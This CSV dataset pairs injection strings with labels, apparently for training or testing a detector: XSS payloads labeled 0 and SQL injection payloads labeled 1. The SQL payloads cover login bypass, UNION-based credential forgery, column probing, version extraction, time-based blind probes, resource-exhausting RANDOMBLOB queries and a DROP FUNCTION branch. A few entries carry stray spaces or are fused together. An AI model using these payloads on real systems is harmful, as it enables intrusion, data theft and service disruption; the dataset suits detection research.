query,label
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",0
"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",0
"<dir onmouseout=""alert(1)"">test</dir>",0
<blockquote onmousewheel=alert(1)>requires scrolling,0
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",0
<strong onpointerover=alert(1)>XSS</strong>,0
"<video onbeforecut=""alert(1)"" contenteditable>test</video>",0
"<style>@keyframes slidein {}</style><bgsound style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bgsound>",0
<element id=x tabindex=1 onfocusin=alert(1)></element>,0
"<table onmouseout=""alert(1)"">test</table>",0
"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sub>",0
<s onafterscriptexecute=alert(1)><script>1</script>,0
"<var onmousedown=""alert(1)"">test</var>",0
<svg><animatetransform onbegin=alert(1) attributeName=transform>,0
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",0
"<picture oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<samp oncontextmenu=""alert(1)"">test</samp>",0
"<source onmouseout=""alert(1)"">test</source>",0
<input value=<><iframe/src=javascript:confirm(1),0
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",0
<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>,0
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",0
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",0
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",0
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,0
"<rtc onkeypress=""alert(1)"" contenteditable>test</rtc>",0
"<spacer onbeforepaste=""alert(1)"" contenteditable>test</spacer>",0
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sup>",0
"<style onmouseleave=""alert(1)"">test</style>",0
<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,0
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",0
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",0
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationstart=""alert(1)""></xmp>",0
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",0
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationstart=""alert(1)""></table>",0
<video2 id=x tabindex=1 onactivate=alert(1)></video2>,0
"<applet onclick=""alert(1)"">test</applet>",0
<dt id=x tabindex=1 onactivate=alert(1)></dt>,0
<slot onafterscriptexecute=alert(1)><script>1</script>,0
',1
`,1
``,1
",",1
"""",1
"""""",1
/,1
//,1
\,1
\\,1
;,1
" or """,1
-- or #,1
 OR '1,1
 OR 1 -- -,1
""" OR """" = """,1
""" OR 1 = 1 -- -",1
 OR '' = ',1
=',1
LIKE',1
=0--+,1
OR 1=1,1
 OR 'x'='x,1
 AND id IS NULL; --,1
''''''''''''UNION SELECT '2,1
AND 1,1
AND 0,1
AND true,1
AND false,1
1-false,1
1-true,1
1*56,1
1' ORDER BY 1--+,1
1' ORDER BY 2--+,1
1' ORDER BY 3--+,1
"1' ORDER BY 1,2--+",1
"1' ORDER BY 1,2,3--+",1
"1' GROUP BY 1,2,--+",1
"1' GROUP BY 1,2,3--+",1
 GROUP BY columnnames having 1=1 --,1
"-1' UNION SELECT 1,2,3--+",1
 UNION SELECT sum(columnname ) from tablename --,1
"-1 UNION SELECT 1 INTO @,@",1
"-1 UN   ION SELECT 1 INTO @,@,@",1
1 AND (SELECT * FROM Users) = 1,1
" AND MID(VERSION(),1,1) = '5';",1
 and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,1
",(select * from (select(sleep(10)))a)",1
%2c(select%20*%20from%20(select(sleep(10)))a),1
;WAITFOR DELAY '0:0:30'--,1
OR 1=1,1
OR 1=0,1
OR x=x,1
OR x=y,1
OR 1=1#,1
OR 1=0#,1
OR x=x#,1
OR x=y#,1
OR 1=1--,1
OR 1=0--,1
OR x=x--,1
OR x=y--,1
OR 3409=3409 AND ('pytW' LIKE 'pytW,1
OR 3409=3409 AND ('pytW' LIKE 'pytY,1
HAVING 1=1,1
HAVING 1=0,1
HAVING 1=1#,1
HAVING 1=0#,1
HAVING 1=1--,1
HAVING 1=0--,1
AND 1=1,1
AND 1=0,1
AND 1=1--,1
AND 1=0--,1
AND 1=1#,1
AND 1=0#,1
AND 1=1 AND '%'=',1
AND 1=0 AND '%'=',1
AND 1083=1083 AND (1427=1427,1
AND 7506=9091 AND (5913=5913,1
AND 1083=1083 AND ('1427=1427,1
AND 7506=9091 AND ('5913=5913,1
AND 7300=7300 AND 'pKlZ'='pKlZ,1
AND 7300=7300 AND 'pKlZ'='pKlY,1
AND 7300=7300 AND ('pKlZ'='pKlZ,1
AND 7300=7300 AND ('pKlZ'='pKlY,1
AS INJECTX WHERE 1=1 AND 1=1,1
AS INJECTX WHERE 1=1 AND 1=0,1
AS INJECTX WHERE 1=1 AND 1=1#,1
AS INJECTX WHERE 1=1 AND 1=0#,1
AS INJECTX WHERE 1=1 AND 1=1--,1
AS INJECTX WHERE 1=1 AND 1=0--,1
WHERE 1=1 AND    1=1,1
WHERE 1=1 AND 1=0,1
WHERE 1=1 AND 1=1#,1
WHERE 1=1 AND 1=0#,1
WHERE 1=1 AND 1=1--,1
WHERE 1=1 AND 1=0--,1
ORDER BY 1--,1
ORDER BY 2--,1
ORDER BY 3--,1
ORDER BY 4--,1
ORDER BY 5--,1
ORDER BY 6--,1
ORDER BY 7--,1
ORDER BY 8--,1
ORDER BY 9--,1
ORDER BY 10--,1
ORDER BY 11--,1
ORDER BY 12--,1
ORDER BY 13--,1
ORDER BY 14--,1
ORDER BY 15--,1
ORDER BY 16--,1
ORDER BY 17--,1
ORDER BY 18--,1
ORDER BY 19--,1
ORDER BY 20--,1
ORDER BY 21--,1
ORDER BY 22--,1
ORDER BY 23--,1
ORDER BY 24--,1
ORDER BY 25--,1
ORDER BY 26--,1
ORDER BY 27--,1
ORDER BY 28--,1
ORDER BY 29--,1
ORDER BY 30--,1
ORDER BY 31337--,1
ORDER BY 1#,1
ORDER BY 2#,1
ORDER BY 3#,1
ORDER BY 4#,1
ORDER BY 5#,1
ORDER BY 6#,1
ORDER BY 7#,1
ORDER BY 8#,1
ORDER BY 9#,1
ORDER BY 10#,1
ORDER BY 11#,1
ORDER BY 12#,1
ORDER BY 13#,1
ORDER BY 14#  ORDER BY 15#,1
ORDER BY 16#,1
ORDER BY 17#,1
ORDER BY 18#,1
ORDER BY 19#,1
ORDER BY 20#,1
ORDER BY 21#,1
ORDER BY 22#,1
ORDER BY 23#,1
ORDER BY 24#,1
ORDER BY 25#,1
ORDER BY 26#,1
ORDER BY 27#,1
ORDER BY 28#,1
ORDER BY 29#,1
ORDER BY 30#,1
ORDER BY 31337#,1
ORDER BY 1,1
ORDER BY 2,1
ORDER BY 3,1
ORDER BY 4,1
ORDER BY 5,1
ORDER BY 6,1
ORDER BY 7,1
ORDER BY 8,1
ORDER BY 9,1
ORDER BY 10,1
ORDER BY 11,1
ORDER BY 12,1
ORDER BY 13,1
ORDER BY 14,1
ORDER BY 15,1
ORDER BY 16,1
ORDER BY 17,1
ORDER BY 18,1
ORDER BY 19,1
ORDER BY 20,1
ORDER BY 21,1
ORDER BY 22,1
ORDER BY 23,1
ORDER BY 24,1
ORDER BY 25,1
ORDER BY 26,1
ORDER BY 27,1
ORDER BY 28,1
ORDER BY 29,1
ORDER BY 30,1
ORDER BY 31337,1
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
RLIKE (SELECT (CASE WHEN (43   46=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
%' AND 8310=8310 AND '%'=',1
%' AND 8310=8311 AND '%'=',1
"and (select substring(@@version,1,1))='X'",1
"and (select substring(@@version,1,1))='M'",1
"and (select substring(@@version,2,1))='i'",1
"and (select substring(@@version,2,1))='y'",1
"and (select substring(@@version,3,1))='c'",1
"and (select substring(@@version,3,1))='S'",1
"and (select substring(@@version,3,1))='X'",1
sleep(5)#,1
1 or sleep(5)#,1
""" or sleep(5)#",1
 or sleep(5)#,1
""" or sleep(5)=""",1
 or sleep(5)=',1
1) or sleep(5)#,1
""") or sleep(5)=""",1
) or sleep(5)=',1
1)) or sleep(5)#,1
""")) or sleep(5)=""",1
)) or sleep(5)=',1
;waitfor delay '0:0:5'--,1
);waitfor delay '0:0:5'--,1
;waitfor delay '0:0:5'--,1
""";waitfor delay '0:0:5'--",1
);waitfor delay '0:0:5'--,1
""");waitfor delay '0:0:5'--",1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
"""));waitfor delay '0:0:5'--",1
"benchmark(10000000,MD5(1))#",1
"1 or benchmark(10000000,MD5(1))#",1
""" or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#",1
"1) or benchmark(10000000,MD5(1))#",1
""") or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#",1
"1)) or benchmark(10000000,MD5(1))#",1
""")) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#",1
pg_sleep(5)--,1
1 or pg_sleep(5)--,1
""" or pg_sleep(5)--",1
 or pg_sleep(5)-   -,1
1) or pg_sleep(5)--,1
""") or pg_sleep(5)--",1
) or pg_sleep(5)--,1
1)) or pg_sleep(5)--,1
""")) or pg_sleep(5)--",1
)) or pg_sleep(5)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,1
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,1
SLEEP(5)#,1
SLEEP(5)--,1
"SLEEP(5)=""",1
SLEEP(5)=',1
or SLEEP(5),1
or SLEEP(5)#,1
or SLEEP(5)--,1
"or SLEEP(5)=""",1
or SLEEP(5)=',1
waitfor delay '00:00:05',1
waitfor delay '00:00:05'--,1
waitfor delay '00:00:05'#,1
"benchmark(50000000,MD5(1))",1
"benchmark(50000000,MD5(1))--",1
"benchmark(50000000,MD5(1))#",1
"or benchmark(50000000,MD5(1))",1
"or benchmark(50000000,MD5(1))--",1
"or benchmark(50000000,MD5(1))#",1
pg_SLEEP(5),1
pg_SLEEP(5)--,1
pg_SLEEP(5)#,1
or pg_SLEEP(5),1
or pg_SLEEP(5)--,1
or pg_SLEEP(5)#,1
"\""",1
AnD SLEEP(5),1
AnD SL   EEP(5)--,1
AnD SLEEP(5)#,1
&&SLEEP(5),1
&&SLEEP(5)--,1
&&SLEEP(5)#,1
 AnD SLEEP(5) ANd '1,1
&&SLEEP(5)&&'1,1
ORDER BY SLEEP(5),1
ORDER BY SLEEP(5)--,1
ORDER BY SLEEP(5)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,1
RANDOMBLOB(500000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
RANDOMBLOB(1000000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",1
-',1
 ',1
&',1
^',1
*',1
 or ''-',1
 or '' ',1
 or ''&',1
 or ''^',1
 or ''*',1
"""-""",1
""" """,1
"""&""",1
"""^""",1
"""*""",1
""" or """"-""",1
""" or """" """,1
""" or """"&""",1
""" or """"^""",1
""" or """"*""",1
or true--,1
""" or true--",1
 or true--,1
""") or true--",1
) or true--,1
 or 'x'='x,1
) or ('x')=('x,1
)) or (('x'))=(('x,1
""" or ""x""=""x",1
""") or (""x"")=(""x",1
""")) or ((""x""))=((""x",1
or 1=1,1
or 1=1--,1
or 1=1#,1
or 1=1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1'='1,1
admin' or '1'='1'--,1
admin' or '1'='1'#,1
admin' or '1'='1'/*,1
admin'or 1=1 or ''=',1
admin' or 1=1,1
admin' or 1=1--,1
admin' or 1=1#,1
admin' or 1=1/*,1
admin') or ('1'='1,1
admin') or ('1'='1'--,1
admin') or ('1'='1'#,1
admin') or ('1'='1'/*,1
admin') or '1'='1,1
admin') or '1'='1'--,1
admin') or '1'='1'#,1
admin') or '1'='1'/*,1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed0   55",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""/*",1
"admin""or 1=1 or """"=""",1
"admin"" or 1=1",1
"admin"" or 1=1--",1
"admin"" or 1=1#",1
"admin"" or 1=1/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""/*",1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" or 1=1
 or 1=1#",1
" or 1=1--
 or 1=1/*",1
 or 1=1,1
 or 1=1#,1
 or 1=1--,1
 or 1=1/*,1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
"1234 "" AND 1=0 UNION ALL SELECT ""root"", ""81dc9bdb52d04dc20036dbd8313ed055",1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" #",1
"admin"" --",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""/*",1
